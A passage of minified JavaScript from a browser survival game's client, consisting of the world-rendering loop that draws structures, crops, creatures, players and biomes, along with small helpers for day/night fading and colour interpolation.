                for (var r = Fe.units[Ye.SAND_WORM], o = 0; o < r.length; o++)
                    r[o].draw_ground();
                for (var a, s = Fe.units[Ye.PLAYERS], o = 0; o < s.length; o++)
                    for (var _ = s[o], E = 0; E < _.swim.length; E++)
                        a = _.swim[E],
                            fe.globalAlpha = a.alpha,
                            ke(fe, a.x + xe.cam.x, a.y + xe.cam.y, a.r),
                            he(fe, ze.SWIM_COLOR[Fe.time]),
                            fe.globalAlpha = 1;
                var u = Fe.units[Ye.BRIDGE];
                for (o = 0; o < u.length; o++)
                    le(u[o], ze.BRIDGE),
                        u[o].draw_life(u[o].info);
                var d = Fe.units[Ye.FURNACE];
                for (o = 0; o < d.length; o++)
                    2 == d[o].action && vr(d[o]);
                var T = Fe.units[Ye.FIRE];
                for (o = 0; o < T.length; o++)
                    vr(T[o], ze.WOOD_FIRE);
                var A = Fe.units[Ye.RESURRECTION];
                for (o = 0; o < A.length; o++)
                    vr(A[o]);
                var h = Fe.units[Ye.EMERALD_MACHINE];
                for (o = 0; o < h.length; o++)
                    vr(h[o]);
                var z = Fe.units[Ye.BIG_FIRE];
                for (o = 0; o < z.length; o++)
                    vr(z[o], ze.BIG_FIRE_WOOD);
                var B = Fe.units[Ye.SIGN];
                for (o = 0; o < B.length; o++)
                    le(B[o]);
                var w = Fe.units[Ye.PLOT];
                for (o = 0; o < w.length; o++)
                    le(w[o], ze.PLOT);
                var l = Fe.units[Ye.SEED];
                for (o = 0; o < l.length; o++)
                    vr(l[o]);
                for (l = Fe.units[Ye.TOMATO_SEED],
                    o = 0; o < l.length; o++)
                    vr(l[o]);
                for (l = Fe.units[Ye.SEED],
                    o = 0; o < l.length; o++)
                    Mr(l[o]);
                var I = Fe.units[Ye.CARROT_SEED];
                for (o = 0; o < I.length; o++)
                    0 != (15 & I[o].info) && 10 !== I[o].info || le(I[o]);
                var c = Fe.units[Ye.WATERMELON_SEED];
                for (o = 0; o < c.length; o++)
                    0 != (15 & c[o].info) && 10 !== c[o].info || le(c[o]);
                var O = Fe.units[Ye.ALOE_VERA_SEED];
                for (o = 0; o < O.length; o++)
                    0 != (15 & O[o].info) && 10 !== O[o].info || le(O[o]);
                var g = Fe.units[Ye.WHEAT_MOB];
                for (o = 0; o < g.length; o++)
                    le(g[o], ze.WHEAT_SEED);
                var p = Fe.units[Ye.GARLIC_SEED];
                for (o = 0; o < p.length; o++)
                    0 != (15 & p[o].info) && 10 !== p[o].info || le(p[o]);
                var R = Fe.units[Ye.THORNBUSH_SEED];
                for (o = 0; o < R.length; o++)
                    0 != (15 & R[o].info) && 10 !== R[o].info || le(R[o]);
                var C = Fe.units[Ye.PUMPKIN_SEED];
                for (o = 0; o < C.length; o++)
                    0 != (15 & C[o].info) && 10 !== C[o].info || le(C[o]);
                for (g = Fe.units[Ye.WHEAT_SEED],
                    o = 0; o < g.length; o++)
                    le(g[o]);
                var W = Fe.units[Ye.CRATE];
                for (o = 0; o < W.length; o++)
                    le(W[o], ze.CRATE, ze.HURT_DEAD_BOX);
                var V = Fe.units[Ye.DEAD_BOX];
                for (o = 0; o < V.length; o++)
                    le(V[o], ze.CRATE, ze.HURT_DEAD_BOX);
                var k = Fe.units[Ye.GIFT];
                for (o = 0; o < k.length; o++)
                    le(k[o], ze.GIFT, ze.HURT_GIFT);
                var b = Fe.units[Ye.WOOD_DOOR_SPIKE];
                for (o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_WOOD_OPEN);
                for (b = Fe.units[Ye.STONE_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_STONE_OPEN);
                for (b = Fe.units[Ye.GOLD_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_GOLD_OPEN);
                for (b = Fe.units[Ye.DIAMOND_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_DIAMOND_OPEN);
                for (b = Fe.units[Ye.AMETHYST_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_AMETHYST_OPEN);
                for (b = Fe.units[Ye.REIDITE_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_GOLD_OPEN);
                for (b = Fe.units[Ye.WOOD_DOOR],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_WOOD_OPEN);
                for (b = Fe.units[Ye.STONE_DOOR],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_STONE_OPEN);
                for (b = Fe.units[Ye.GOLD_DOOR],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_GOLD_OPEN);
                for (b = Fe.units[Ye.DIAMOND_DOOR],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_DIAMOND_OPEN);
                for (b = Fe.units[Ye.AMETHYST_DOOR],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_AMETHYST_OPEN);
                for (b = Fe.units[Ye.REIDITE_DOOR],
                    o = 0; o < b.length; o++)
                    1 == b[o].extra && le(b[o], ze.DOOR_GOLD_OPEN);
                var K = Fe.units[Ye.RABBIT];
                for (o = 0; o < K.length; o++)
                    le(K[o], ze.RABBIT, ze.HURT_RABBIT);
                var N = Fe.units[Ye.BED];
                for (o = 0; o < N.length; o++)
                    le(N[o], ze.BED);
                for (r = Fe.units[Ye.SAND_WORM],
                    o = 0; o < r.length; o++)
                    le(r[o], ze.SAND_WORM, ze.HURT_SAND_WORM);
                var S = Fe.units[Ye.SPELL];
                for (o = 0; o < S.length; o++)
                    0 === S[o].fly && le(S[o]);
                for (s = Fe.units[Ye.PLAYERS],
                    o = 0; o < s.length; o++) {
                    var m, _ = s[o];
                    s[o].vehicle !== Be.BABY_DRAGON && s[o].vehicle !== Be.BABY_LAVA && s[o].vehicle !== Be.HAWK && s[o].vehicle !== Be.PLANE && s[o].vehicle !== Be.NIMBUS ? 0 === _.tower && (.001 < _.tower_fx ? (_.tower_fx = Utils.lerp(_.tower_fx, 0, .018),
                        m = 1 + .18 * Math.min(1, Math.max(_.tower_fx, 0) / 100),
                        fe.save(),
                        fe.scale(m, m),
                        xe.cam.x /= m,
                        xe.cam.y /= m,
                        _.x /= m,
                        _.y /= m,
                        _.r.x /= m,
                        _.r.y /= m,
                        _.draw_vehicle(),
                        _.draw(),
                        xe.cam.x *= m,
                        xe.cam.y *= m,
                        _.x *= m,
                        _.y *= m,
                        _.r.x *= m,
                        _.r.y *= m,
                        fe.restore()) : (_.fly = 0,
                            _.draw_vehicle(),
                            _.draw())) : _.speed <= 180 && (fe.save(),
                                m = 1 + .35 * Math.min(1, Math.max(_.vehicle_fx5 - 30, 0) / 180),
                                fe.scale(m, m),
                                xe.cam.x /= m,
                                xe.cam.y /= m,
                                _.x /= m,
                                _.y /= m,
                                _.r.x /= m,
                                _.r.y /= m,
                                _.fly = 0,
                                _.draw_vehicle(),
                                _.draw(),
                                xe.cam.x *= m,
                                xe.cam.y *= m,
                                _.x *= m,
                                _.y *= m,
                                _.r.x *= m,
                                _.r.y *= m,
                                fe.restore())
                }
                for (N = Fe.units[Ye.BED],
                    o = 0; o < N.length; o++)
                    le(N[o], ze.BED_TOP);
                var U = Fe.units[Ye.CRAB];
                for (o = 0; o < U.length; o++)
                    le(U[o]);
                var Y = Fe.units[Ye.FOX];
                for (o = 0; o < Y.length; o++)
                    le(Y[o], ze.FOX, ze.HURT_FOX);
                var F = Fe.units[Ye.BOAR];
                for (o = 0; o < F.length; o++)
                    le(F[o]);
                var x = Fe.units[Ye.WOLF];
                for (o = 0; o < x.length; o++)
                    le(x[o], ze.WOLF, ze.HURT_WOLF);
                var J = Fe.units[Ye.BABY_DRAGON];
                for (o = 0; o < J.length; o++)
                    le(J[o], ze.BABY_DRAGON, ze.HURT_BABY_DRAGON);
                var X = Fe.units[Ye.BABY_LAVA];
                for (o = 0; o < X.length; o++)
                    le(X[o], ze.BABY_LAVA, ze.HURT_BABY_LAVA);
                for (I = Fe.units[Ye.CARROT_SEED],
                    o = 0; o < I.length; o++)
                    0 != (15 & I[o].info) && 10 !== I[o].info && le(I[o]);
                for (c = Fe.units[Ye.WATERMELON_SEED],
                    o = 0; o < c.length; o++)
                    0 != (15 & c[o].info) && 10 !== c[o].info && le(c[o]);
                for (O = Fe.units[Ye.ALOE_VERA_MOB],
                    o = 0; o < O.length; o++)
                    le(O[o], ze.ALOE_VERA);
                for (O = Fe.units[Ye.ALOE_VERA_SEED],
                    o = 0; o < O.length; o++)
                    0 != (15 & O[o].info) && 10 !== O[o].info && le(O[o]);
                for (l = Fe.units[Ye.TOMATO_SEED],
                    o = 0; o < l.length; o++)
                    Mr(l[o]);
                for (p = Fe.units[Ye.GARLIC_SEED],
                    o = 0; o < p.length; o++)
                    0 != (15 & p[o].info) && 10 !== p[o].info && le(p[o]);
                for (R = Fe.units[Ye.THORNBUSH_SEED],
                    o = 0; o < R.length; o++)
                    0 != (15 & R[o].info) && 10 !== R[o].info && le(R[o]);
                for (C = Fe.units[Ye.PUMPKIN_SEED],
                    o = 0; o < C.length; o++)
                    0 != (15 & C[o].info) && 10 !== C[o].info && le(C[o]);
                var j = Fe.units[Ye.TREASURE_CHEST];
                for (o = 0; o < j.length; o++)
                    le(j[o], ze.TREASURE_CHEST, ze.HURT_TREASURE_CHEST);
                var q = Fe.units[Ye.KRAKEN];
                for (o = 0; o < q.length; o++)
                    le(q[o], ze.KRAKEN, ze.HURT_KRAKEN);
                var Z = Fe.units[Ye.PIRANHA];
                for (o = 0; o < Z.length; o++)
                    le(Z[o], ze.PIRANHA, ze.HURT_PIRANHA);
                var Q = Fe.units[Ye.SPIDER];
                for (o = 0; o < Q.length; o++)
                    le(Q[o], ze.SPIDER, ze.HURT_SPIDER);
                var $ = Fe.units[Ye.PENGUIN];
                for (o = 0; o < $.length; o++)
                    le($[o], ze.PENGUIN, ze.HURT_PENGUIN);
                var ee = Fe.units[Ye.BEAR];
                for (o = 0; o < ee.length; o++)
                    le(ee[o], ze.BEAR, ze.HURT_BEAR);
                var te = Fe.units[Ye.BABY_MAMMOTH];
                for (o = 0; o < te.length; o++)
                    le(te[o]);
                var ie = Fe.units[Ye.FLAME];
                for (o = 0; o < ie.length; o++)
                    le(ie[o], ze.FIRE_MOB, ze.HURT_FIRE_MOB);
                var ne = Fe.units[Ye.CRAB_BOSS];
                for (o = 0; o < ne.length; o++)
                    le(ne[o]);
                var re = Fe.units[Ye.MAMMOTH];
                for (o = 0; o < re.length; o++)
                    le(re[o], ze.MAMMOTH, ze.HURT_MAMMOTH);
                var D = Fe.units[Ye.DRAGON];
                for (o = 0; o < D.length; o++)
                    1 === D[o].scale && le(D[o], ze.DRAGON, ze.HURT_DRAGON);
                for (D = Fe.units[Ye.LAVA_DRAGON],
                    o = 0; o < D.length; o++)
                    1 === D[o].scale && le(D[o], ze.LAVA_DRAGON, ze.HURT_LAVA_DRAGON);
                var oe = Fe.units[Ye.CHEST];
                for (o = 0; o < oe.length; o++)
                    le(oe[o]);
                var ae = Fe.units[Ye.WORKBENCH];
                for (o = 0; o < ae.length; o++)
                    le(ae[o], ze.WORKBENCH);
                for (d = Fe.units[Ye.FURNACE],
                    o = 0; o < d.length; o++)
                    le(d[o]);
                var v = Fe.units[Ye.BREAD_OVEN];
                for (o = 0; o < v.length; o++)
                    le(v[o]);
                for (b = Fe.units[Ye.WOOD_DOOR],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10012 : 10013),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.STONE_DOOR],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10014 : 10015),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.GOLD_DOOR],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10016 : 10017),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.DIAMOND_DOOR],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10018 : 10019),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.AMETHYST_DOOR],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10020 : 10021),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.REIDITE_DOOR],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10022 : 10023),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.WOOD_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10024 : 10025),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.STONE_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10026 : 10027),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.GOLD_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10028 : 10029),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.DIAMOND_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10030 : 10031),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.AMETHYST_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10032 : 10033),
                        b[o].draw_life(b[o].info);
                for (b = Fe.units[Ye.REIDITE_DOOR_SPIKE],
                    o = 0; o < b.length; o++)
                    0 == b[o].extra && le(b[o], b[o].ally ? 10034 : 10035),
                        b[o].draw_life(b[o].info);
                var M = Fe.units[Ye.WALL];
                for (o = 0; o < M.length; o++)
                    le(M[o], ze.WALL),
                        M[o].draw_life(M[o].info);
                for (M = Fe.units[Ye.STONE_WALL],
                    o = 0; o < M.length; o++)
                    le(M[o], ze.STONE_WALL),
                        M[o].draw_life(M[o].info);
                for (M = Fe.units[Ye.GOLD_WALL],
                    o = 0; o < M.length; o++)
                    le(M[o], ze.GOLD_WALL),
                        M[o].draw_life(M[o].info);
                for (M = Fe.units[Ye.DIAMOND_WALL],
                    o = 0; o < M.length; o++)
                    le(M[o], ze.DIAMOND_WALL),
                        M[o].draw_life(M[o].info);
                for (M = Fe.units[Ye.AMETHYST_WALL],
                    o = 0; o < M.length; o++)
                    le(M[o], ze.AMETHYST_WALL),
                        M[o].draw_life(M[o].info);
                for (M = Fe.units[Ye.REIDITE_WALL],
                    o = 0; o < M.length; o++)
                    le(M[o], ze.REIDITE_WALL),
                        M[o].draw_life(M[o].info);
                var f = Fe.units[Ye.SPIKE];
                for (o = 0; o < f.length; o++)
                    le(f[o], f[o].ally ? 10010 : 10011),
                        f[o].draw_life(f[o].info);
                for (f = Fe.units[Ye.STONE_SPIKE],
                    o = 0; o < f.length; o++)
                    le(f[o], f[o].ally ? 10008 : 10009),
                        f[o].draw_life(f[o].info);
                for (f = Fe.units[Ye.GOLD_SPIKE],
                    o = 0; o < f.length; o++)
                    le(f[o], f[o].ally ? 10006 : 10007),
                        f[o].draw_life(f[o].info);
                for (f = Fe.units[Ye.DIAMOND_SPIKE],
                    o = 0; o < f.length; o++)
                    le(f[o], f[o].ally ? 10004 : 10005),
                        f[o].draw_life(f[o].info);
                for (f = Fe.units[Ye.AMETHYST_SPIKE],
                    o = 0; o < f.length; o++)
                    le(f[o], f[o].ally ? 10002 : 10003),
                        f[o].draw_life(f[o].info);
                for (f = Fe.units[Ye.REIDITE_SPIKE],
                    o = 0; o < f.length; o++)
                    le(f[o], f[o].ally ? ze.REIDITE_SPIKE2 : ze.REIDITE_SPIKE),
                        f[o].draw_life(f[o].info);
                var se = Fe.units[Ye.WELL];
                for (o = 0; o < se.length; o++) {
                    var L = se[o];
                    0 < L.info ? le(L, ze.WELL_FULL) : le(L, ze.WELL_EMPTY)
                }
                var _e = Fe.units[Ye.TOTEM];
                for (o = 0; o < _e.length; o++)
                    le(_e[o], ze.TOTEM);
                Hr(pr, i, n, e, t, ze.GOLD, "g", 2),
                    Hr(pr, i, n, e, t, ze.GOLD_WINTER, "gw", 2),
                    Hr(pr, i, n, e, t, ze.DIAMOND, "d", 2),
                    Hr(pr, i, n, e, t, ze.DIAMOND_WINTER, "dw", 2),
                    Hr(pr, i, n, e, t, ze.PLANT, "p", 0),
                    Hr(pr, i, n, e, t, ze.EMERALD, "m", 2),
                    Hr(pr, i, n, e, t, ze.AMETHYST, "a", 2),
                    Hr(pr, i, n, e, t, ze.REIDITE, "re", 2),
                    Hr(pr, i, n, e, t, ze.SHADOW_CAVE_STONES, "cs", 3, 3),
                    Hr(pr, i, n, e, t, ze.SHADOW_CAVE_STONES, "cs", 2, 2),
                    Hr(pr, i, n, e, t, ze.SHADOW_CAVE_STONES, "cs", 1, 1),
                    Hr(pr, i, n, e, t, ze.SHADOW_CAVE_STONES, "cs", 0, 0),
                    Hr(pr, i, n, e, t, ze.CAVE_STONES, "cs", 3, 3),
                    Hr(pr, i, n, e, t, ze.CAVE_STONES, "cs", 2, 2),
                    Hr(pr, i, n, e, t, ze.CAVE_STONES, "cs", 1, 1),
                    Hr(pr, i, n, e, t, ze.CAVE_STONES, "cs", 0, 0);
                var G = Fe.units[Ye.FRUIT];
                for (o = 0; o < G.length; o++)
                    for (E = 0; E < G[o].info; E++)
                        le(G[o].fruits[E], ze.FRUIT);
                Hr(pr, i, n, e, t, ze.STONES, "s", 2);
                var y = Fe.units[Ye.EXTRACTOR_MACHINE_STONE];
                for (o = 0; o < y.length; o++)
                    le(y[o]);
                for (y = Fe.units[Ye.EXTRACTOR_MACHINE_GOLD],
                    o = 0; o < y.length; o++)
                    le(y[o]);
                for (y = Fe.units[Ye.EXTRACTOR_MACHINE_DIAMOND],
                    o = 0; o < y.length; o++)
                    le(y[o]);
                for (y = Fe.units[Ye.EXTRACTOR_MACHINE_AMETHYST],
                    o = 0; o < y.length; o++)
                    le(y[o]);
                for (y = Fe.units[Ye.EXTRACTOR_MACHINE_REIDITE],
                    o = 0; o < y.length; o++)
                    le(y[o]);
                var H = Fe.units[Ye.WINDMILL];
                for (o = 0; o < H.length; o++)
                    vr(H[o]);
                for (T = Fe.units[Ye.FIRE],
                    o = 0; o < T.length; o++)
                    Mr(T[o]);
                for (T = Fe.units[Ye.BIG_FIRE],
                    o = 0; o < T.length; o++)
                    Mr(T[o]);
                for (d = Fe.units[Ye.FURNACE],
                    o = 0; o < d.length; o++)
                    2 == d[o].action && Mr(d[o]);
                for (v = Fe.units[Ye.BREAD_OVEN],
                    o = 0; o < v.length; o++)
                    Mr(v[o]);
                for (A = Fe.units[Ye.RESURRECTION],
                    o = 0; o < A.length; o++)
                    Mr(A[o]);
                for (h = Fe.units[Ye.EMERALD_MACHINE],
                    o = 0; o < h.length; o++)
                    Mr(h[o]),
                        h[o].draw_life(h[o].info);
                for (Hr(pr, i, n, e, t, ze.CACTUS, "c", 0),
                    Hr(pr, i, n, e, t, ze.TREE, "t", 5, 4),
                    Hr(pr, i, n, e, t, ze.FIR, "f", 2, 2),
                    Hr(pr, i, n, e, t, ze.PALM, "plm", 0, 0),
                    Hr(pr, i, n, e, t, ze.TREE_BRANCH, "b", 3, 2),
                    Hr(pr, i, n, e, t, ze.TREE, "t", 3, 2),
                    Hr(pr, i, n, e, t, ze.TREE_BRANCH, "b", 1, 0),
                    Hr(pr, i, n, e, t, ze.FIR, "f", 1, 1),
                    Hr(pr, i, n, e, t, ze.PALM, "plm", 1, 1),
                    Hr(pr, i, n, e, t, ze.TREE, "t", 1, 0),
                    Hr(pr, i, n, e, t, ze.FIR, "f", 0, 0),
                    Hr(pr, i, n, e, t, ze.PALM, "plm", 2, 2),
                    H = Fe.units[Ye.WINDMILL],
                    o = 0; o < H.length; o++)
                    Mr(H[o]);
                var Ee = Fe.units[Ye.WOOD_TOWER];
                for (o = 0; o < Ee.length; o++)
                    le(Ee[o], ze.WOOD_TOWER);
                for (s = Fe.units[Ye.PLAYERS],
                    o = 0; o < s.length; o++)
                    1 === (_ = s[o]).tower && (_.speed < 180 || _.vehicle !== Be.BABY_DRAGON && _.vehicle !== Be.BABY_LAVA && _.vehicle !== Be.NIMBUS && _.vehicle !== Be.HAWK && _.vehicle !== Be.PLANE) && (_.tower_fx = Utils.lerp(_.tower_fx, 100, .018),
                        m = 1 + .18 * Math.min(1, Math.max(_.tower_fx, 0) / 100),
                        fe.save(),
                        fe.scale(m, m),
                        xe.cam.x /= m,
                        xe.cam.y /= m,
                        _.x /= m,
                        _.y /= m,
                        _.r.x /= m,
                        _.r.y /= m,
                        _.draw_vehicle(),
                        _.draw(),
                        xe.cam.x *= m,
                        xe.cam.y *= m,
                        _.x *= m,
                        _.y *= m,
                        _.r.x *= m,
                        _.r.y *= m,
                        fe.restore());
                var P = Fe.units[Ye.ROOF];
                for (o = 0; o < P.length; o++)
                    le(P[o], ze.ROOF),
                        P[o].draw_life(P[o].info);
                var ue = Fe.units[Ye.FIREFLY];
                for (o = 0; o < ue.length; o++)
                    le(ue[o], ze.FIREFLY, ze.HURT_FIREFLY);
                var de = Fe.units[Ye.GARLAND];
                for (o = 0; o < de.length; o++)
                    le(de[o], ze.GARLAND);
                for (s = Fe.units[Ye.PLAYERS],
                    o = 0; o < s.length; o++)
                    ((_ = s[o]).vehicle === Be.BABY_DRAGON || _.vehicle === Be.BABY_LAVA || _.vehicle === Be.NIMBUS || _.vehicle === Be.HAWK || _.vehicle === Be.PLANE) && 180 < _.speed && (_.fly = 1,
                        fe.save(),
                        m = 1 + .35 * Math.min(1, Math.max(_.vehicle_fx5 - 30, 0) / 180),
                        fe.scale(m, m),
                        xe.cam.x /= m,
                        xe.cam.y /= m,
                        _.x /= m,
                        _.y /= m,
                        _.r.x /= m,
                        _.r.y /= m,
                        _.draw_vehicle(),
                        _.draw(),
                        xe.cam.x *= m,
                        xe.cam.y *= m,
                        _.x *= m,
                        _.y *= m,
                        _.r.x *= m,
                        _.r.y *= m,
                        fe.restore());
                for (S = Fe.units[Ye.SPELL],
                    o = 0; o < S.length; o++)
                    1 === S[o].fly && le(S[o]);
                for (D = Fe.units[Ye.DRAGON],
                    o = 0; o < D.length; o++)
                    1 < D[o].scale && le(D[o], ze.DRAGON, ze.HURT_DRAGON);
                for (D = Fe.units[Ye.LAVA_DRAGON],
                    o = 0; o < D.length; o++)
                    1 < D[o].scale && le(D[o], ze.LAVA_DRAGON, ze.HURT_LAVA_DRAGON);
                var Te = Fe.units[Ye.HAWK];
                for (o = 0; o < Te.length; o++)
                    le(Te[o], ze.HAWK, ze.HURT_HAWK);
                var Ae = Fe.units[Ye.VULTURE];
                for (o = 0; o < Ae.length; o++)
                    le(Ae[o], ze.VULTURE, ze.HURT_VULTURE);
                if (60 < (lr += 15 * qe) && (lr -= 60),
                    Hr(Ir, i, n, e, t, ze.FOG, "fo", 2),
                    Hr(Ir, i, n, e, t, ze.FOD, "fod", 2),
                    window.drawShit)
                    for (let e = 0; e < window.drawShit[0].length; e++)
                        fe.save(),
                            fe.beginPath(),
                            fe.lineWidth = 5,
                            fe.arc(window.drawShit[0][e].x + xe.cam.x, window.drawShit[0][e].y + xe.cam.y, window.drawShit[0][e].r, 0, 2 * Math.PI, !1),
                            fe.stroke(),
                            fe.restore()
            }
            function vr(e, t) {
                Fe.transition ? (fe.globalAlpha = 1,
                    e.draw_bg(t),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    e.draw_bg(t),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : e.draw_bg(t)
            }
            function Mr(e, t) {
                Fe.transition ? (fe.globalAlpha = 1,
                    e.draw_fg(t),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    e.draw_fg(t),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : e.draw_fg(t)
            }
            function fr(e, t, i, n) {
                Fe.transition ? (fe.globalAlpha = 1,
                    Ke(fe, sprite[e][Fe.time], i, n),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    Ke(fe, sprite[e][Fe.time], i, n),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : Ke(fe, t, i, n)
            }
            function Lr(e, t, i, n, r) {
                var o = i.width
                    , i = i.height
                    , a = Math.floor(o / 2)
                    , s = Math.floor(i / 2);
                Fe.transition ? (fe.globalAlpha = 1,
                    Ke(fe, sprite[e][t][Fe.time], 0, 0, o, i, n, r, a, s),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    Ke(fe, sprite[e][t][Fe.time], 0, 0, o, i, n, r, a, s),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : Ke(fe, sprite[e][t][Fe.time], 0, 0, o, i, n, r, a, s)
            }
            function Gr(e, t, i, n) {
                var r = t.width
                    , o = t.height
                    , a = Math.floor(r / 2)
                    , s = Math.floor(o / 2);
                Fe.transition ? (fe.globalAlpha = 1,
                    Ke(fe, sprite[e][Fe.time], 0, 0, r, o, i, n, a, s),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    Ke(fe, sprite[e][Fe.time], 0, 0, r, o, i, n, a, s),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : Ke(fe, t, 0, 0, r, o, i, n, a, s)
            }
            function yr(e, t, i, n, r) {
                Fe.transition && 1 == r ? (fe.globalAlpha = 1,
                    Ke(fe, sprite[e][Fe.time][t], i, n),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    Ke(fe, sprite[e][Fe.time][t], i, n),
                    Fe.time = Fe.time ? 0 : 1) : (fe.globalAlpha = r,
                        Ke(fe, sprite[e][Fe.time][t], i, n)),
                    fe.globalAlpha = 1
            }
            function le(e, t, i) {
                Fe.transition ? (fe.globalAlpha = 1,
                    e.draw(t, i),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    e.draw(t, i),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : e.draw(t, i)
            }
            function Hr(e, t, i, n, r, o, a, s, _, E) {
                Fe.transition ? (fe.globalAlpha = 1,
                    e(t, i, n, r, o, a, s, _, E),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1 - Fe.shade.v,
                    e(t, i, n, r, o, a, s, _, E),
                    Fe.time = Fe.time ? 0 : 1,
                    fe.globalAlpha = 1) : e(t, i, n, r, o, a, s, _, E)
            }
            function Pr(e, t, i, n, r, o, a) {
                var s = "#";
                return (s = (s += (n = Math.floor(n * a + (1 - a) * e)) < 16 ? "0" + n.toString(16) : n.toString(16)) + ((n = Math.floor(r * a + (1 - a) * t)) < 16 ? "0" + n.toString(16) : n.toString(16))) + ((n = Math.floor(o * a + (1 - a) * i)) < 16 ? "0" + n.toString(16) : n.toString(16))
            }
            function zr() {
                for (var e, t, i, n, r, o, a, s, _, E, u = Fe.biomes.length - 1; 0 <= u; u--)
                    (T = Fe.biomes[u]).t === Fe.BIOME_SEA && (e = Fe.BIOME[T.t],
                        -xe.cam.x >= T.x1 - 230 - Le) && -xe.cam.x <= T.x2 + 330 && -xe.cam.y >= T.y1 - Ge && -xe.cam.y <= T.y2 + 100 && (t = T.x2,
                            T.t !== Fe.BIOME_SEA && (t -= 610),
                            i = T.x1,
                            T.t !== Fe.BIOME_SEA && (i += 610),
                            n = T.y2,
                            T.t !== Fe.BIOME_SEA && (n -= 610),
                            r = T.y1,
                            T.t !== Fe.BIOME_SEA && (r += 610),
                            Fe.transition ? (o = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                                fe.fillStyle = Pr(e.night[0], e.night[1], e.night[2], e.day[0], e.day[1], e.day[1], o)) : fe.fillStyle = e._color[Fe.time],
                            a = Math.max(xe.cam.x + i - 2 - 230, 0),
                            s = Math.max(-xe.cam.x + Le - t - 330 - 2, 0),
                            _ = Math.max(xe.cam.y + r - 2, 0),
                            E = Math.max(-xe.cam.y + Ge - n - 100 - 2, 0),
                            fe.beginPath(),
                            fe.fillRect(a, _, Le - s - a, Ge - _ - E));
                for (u = Fe.biomes.length - 1; 0 <= u; u--)
                    (T = Fe.biomes[u]).t !== Fe.BIOME_SEA && (t = T.x2,
                        T.t !== Fe.BIOME_SEA && (t -= 400),
                        i = T.x1,
                        T.t !== Fe.BIOME_SEA && (i += 400),
                        n = T.y2,
                        T.t !== Fe.BIOME_SEA && (n -= 300),
                        r = T.y1,
                        T.t !== Fe.BIOME_SEA && (r += 300),
                        0 == (T.v & Ue.RIGHT) && -xe.cam.x >= t - Le + 120 && -xe.cam.x <= t + 820 && -xe.cam.y >= r + 88 - Ge && -xe.cam.y <= n + 50 && (kr(t, r + 88, n - 88, xe.beach[0], Fe.BIOME[T.t], T.v & Ue.RIGHT),
                            Kr(t, r + 88, n - 88, xe.beach[0], Fe.BIOME[T.t], T.v & Ue.RIGHT)),
